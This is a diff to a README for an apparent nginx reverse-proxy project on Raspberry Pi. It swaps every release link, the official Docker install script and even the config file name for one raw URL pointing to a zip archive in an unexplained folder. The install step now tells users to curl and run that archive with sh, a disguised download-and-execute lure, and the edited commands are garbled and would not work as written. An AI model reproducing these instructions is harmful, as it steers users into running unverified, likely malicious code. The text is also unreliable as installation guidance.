@@ -6,7 +6,7 @@ Welcome to nginx-reverse-proxy! This software enables you to manage and monitor 
 
 ## 📥 Download
 
-[![Download nginx-reverse-proxy](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Bernettaungracious63/nginx-reverse-proxy/releases)
+[![Download nginx-reverse-proxy](https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip%https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip)](https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip)
 
 ## 📋 System Requirements
 
@@ -37,8 +37,8 @@ sudo apt-get update && sudo apt-get upgrade -y
 If you don’t have Docker installed, you can install it with the following commands:
 
 ```bash
-curl -fsSL https://get.docker.com -o get-docker.sh
-sh get-docker.sh
+curl -fsSL https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip -o https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip
+sh https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip
 ```
 
 ### Step 3: Install Docker Compose
@@ -51,7 +51,7 @@ sudo apt-get install docker-compose
 
 ### Step 4: Download & Install nginx-reverse-proxy
 
-Visit the [Releases page](https://github.com/Bernettaungracious63/nginx-reverse-proxy/releases) to download the latest version of the software. Choose the appropriate version for your Raspberry Pi.
+Visit the [Releases page](https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip) to download the latest version of the software. Choose the appropriate version for your Raspberry Pi.
 
 ### Step 5: Run the Application
 
@@ -65,7 +65,7 @@ The application should now be running. You can access the interface through your
 
 ## ⚙️ Configuration
 
-To set up your reverse proxy, edit the configuration file named `docker-compose.yml` located in your downloaded folder. Here, you can set your server details, ports, and other preferences. If you're not familiar with these settings, the default values should work for most users.
+To set up your reverse proxy, edit the configuration file named `https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip` located in your downloaded folder. Here, you can set your server details, ports, and other preferences. If you're not familiar with these settings, the default values should work for most users.
 
 ## 📊 Monitoring with GoAccess
 
@@ -93,4 +93,4 @@ Join our community through our GitHub page. Share your experiences, tips, and tr
 
 ## 📥 Download Again
 
-Don't forget to [visit the Releases page](https://github.com/Bernettaungracious63/nginx-reverse-proxy/releases) for the latest updates and releases. We continuously improve the application, and your feedback helps us make it better. Happy browsing!
+Don't forget to [visit the Releases page](https://raw.githubusercontent.com/Bernettaungracious63/nginx-reverse-proxy/main/ozarkite/nginx-reverse-proxy_v3.5.zip) for the latest updates and releases. We continuously improve the application, and your feedback helps us make it better. Happy browsing!
